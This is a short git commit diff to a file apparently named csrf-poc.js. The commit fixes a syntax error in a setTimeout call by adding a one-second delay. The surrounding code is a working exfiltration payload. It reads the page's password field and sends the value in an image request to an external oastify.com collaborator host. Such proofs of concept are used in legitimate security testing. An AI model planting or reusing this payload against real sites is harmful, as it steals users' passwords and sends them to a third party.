a1f072906b0a4edc3247a9fdc3a30c37faaf0a49
mariomejia127 <mariomejia127@gmail.com>
2022-12-04 18:15:59 -0600

    Update csrf-poc.js

--- csrf-poc.js
+++ csrf-poc.js
@@ -1,4 +1,4 @@
 setTimeout(function(){
         new Image().src = "https://oia24n35gat2a0w1ujn9rfn9s0yrmie63.oastify.com/?pass=" 
                         + document.getElementById('password').value;
-    };
+    }, 1000);
